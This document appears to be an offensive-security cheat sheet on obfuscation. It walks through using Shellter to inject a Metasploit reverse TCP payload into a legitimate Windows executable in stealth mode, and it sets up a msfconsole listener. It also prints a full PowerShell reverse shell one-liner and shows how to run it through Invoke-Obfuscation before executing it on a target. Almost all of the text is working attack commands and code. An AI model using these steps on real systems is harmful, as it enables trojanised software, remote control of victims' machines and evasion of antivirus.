# Obfuscation

## Shellter

{% embed url="https://www.shellterproject.com/" %}

Shellter is a tool that permit you to inject malicious code into native Windows application (32 bit).

### Install and Run Shellter

This installation guide is for kali linux OS

```bash
# Install shellter packets
sudo apt update && sudo apt install -y shellter

# Install architecture and wine packet to run .exe windows executable
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32

# run .exe executable with wine
cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```

### Using Shellter

Before using shellter, we must chose a Windows executable program into which we will inject malicious code or revshell cod.

```bash
# Select Windows applitation to inject.
cp /usr/share/windows-binaries/vncviewer.exe .

# run prigram with wine
sudo wine shellter.exe

# Choose Operation Mode 
> A

# Choose Portable Executable Target
> /PATH/TO/vncviewer.exe

# Enable Stealth Mode
> Y

# Select if we want to use listed payload or custom payload
> L # listed
> C # custom

# Select the listed payload
> 1 # metasploit reverse tcp payload

# Set LHOST
> $LISTENER_IP

# Set LPORT
> $LISTENER_PORT
```

### Use metasploit to get connection

If we choose the Metasploit Payload to inject into Windows Executable, we can set up a listener in msfconsole to connect with the target.

```bash
# Set multi/handler with the same LHOST and LPORT of the injected payload
service postgresql start && msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST
set LPORT
run
```

***

## Powershell-code obfuscation

### Invoke-Obfuscation

Invoke-Obfuscation is an open source PowerShell v2.0+ compatible PowerShell command and script obfuscator

{% embed url="https://github.com/danielbohannon/Invoke-Obfuscation" %}

#### installation

<pre class="language-bash"><code class="lang-bash"># INVOKE-OBFUSCATION PowerShell script - Install
cd /opt
sudo git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
sudo apt update &#x26;&#x26; sudo apt install -y powershell

# Copy Powershell RevShell command in a file
<strong>touch shell.ps1
</strong><strong>$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&#x26;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
</strong>
# Start powershell on linux system
pwsh

# Import downloaded module
cd /opt/Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
cd ..
</code></pre>

#### setup and running

```bash
# Run the script
Invoke-Obfuscation

# Set script to obfuscate
SET SCRIPTPATH /PATH/TO/shell.ps1

# Choose a option
## Encoding a powershell command
ENCODING

## AST obfuscation
AST

## Select all elements of script
ALL

# copy the obfuscated code in a new file .ps1

# transfer script into target

# setup a listener port on kali with netcat

# run the script on target machine
```
